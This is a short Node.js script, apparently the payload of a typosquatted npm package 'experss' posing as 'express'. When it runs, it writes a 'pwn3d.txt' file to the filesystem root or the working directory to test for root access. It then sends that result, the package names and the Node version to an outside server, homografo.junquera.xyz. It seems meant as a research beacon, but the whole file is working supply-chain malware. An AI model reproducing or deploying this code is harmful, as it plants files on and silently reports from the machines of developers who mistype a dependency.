const http = require('http');
const fs = require('fs')

let is_sudo = false;

const isSudo = () =>
  new Promise((resolve, reject) => {
    fs.writeFile("/pwn3d.txt", "You are (fully) pwn3d due to a homobraphic error on your software dependencies", function(err){
      if(err){
        fs.writeFile("pwn3d.txt", "You are (fully) pwn3d due to a homobraphic error on your software dependencies", function(err){});
        resolve(false);
      } else {
        resolve(true);
      }
    })
})

const run = async() =>{
  const is_sudo = await isSudo()


  // console.log(await isSudo())

  let sender = "npm";
  let original_name = "express";
  let new_name = "experss";
  let version = process.version;

  let data = {
      "is_sudo": is_sudo? "True":"False",
      "sender": sender,
      "original_name": original_name,
      "new_name": new_name,
      "version": version
  }

  // data = JSON.stringify(data);
  var encoded = "";
  for(var prop in data) {
    encoded += prop + "=" + data[prop] + "&";
  }
  data = encoded.substring(0, encoded.length - 1) + "\n";

  var options = {
    host: 'homografo.junquera.xyz',
    port: 9999,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': data.length
    }
  }

  var req = http.request(options);

  req.write(data);

  req.end();

}

run()
